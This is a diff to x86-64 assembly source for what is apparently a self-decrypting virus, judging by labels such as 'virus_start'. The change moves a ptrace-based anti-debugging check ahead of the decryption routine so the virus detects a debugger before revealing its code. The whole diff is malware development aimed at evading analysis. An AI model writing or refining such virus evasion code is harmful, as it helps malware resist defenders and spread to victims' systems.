@@ -32,7 +32,21 @@ _start:
     push r13
     push r14
     push r15
-
+    ; ============================================
+    ; ANTI-DEBUGGING CHECK
+    ; Use ptrace(PTRACE_TRACEME) to detect debugger
+    ; Returns -1 (EPERM) if already being traced
+    ; ============================================
+    mov eax, SYS_PTRACE
+    mov edi, PTRACE_TRACEME
+    xor esi, esi
+    xor edx, edx
+    xor r10d, r10d
+    syscall
+    
+    ; If ptrace returns -1, we're being debugged
+    cmp rax, -1
+    je .being_debugged
     ; ============================================
     ; DECRYPTION CHECK AND ROUTINE
     ; Check if code is encrypted and decrypt if needed
@@ -96,21 +110,7 @@ _start:
     pop r15
     sub r15, .get_base_after_decrypt - virus_start
 
-    ; ============================================
-    ; ANTI-DEBUGGING CHECK
-    ; Use ptrace(PTRACE_TRACEME) to detect debugger
-    ; Returns -1 (EPERM) if already being traced
-    ; ============================================
-    mov eax, SYS_PTRACE
-    mov edi, PTRACE_TRACEME
-    xor esi, esi
-    xor edx, edx
-    xor r10d, r10d
-    syscall
-    
-    ; If ptrace returns -1, we're being debugged
-    cmp rax, -1
-    je .being_debugged
+
 
     ; Get base address using RIP-relative call trick
     call .get_base
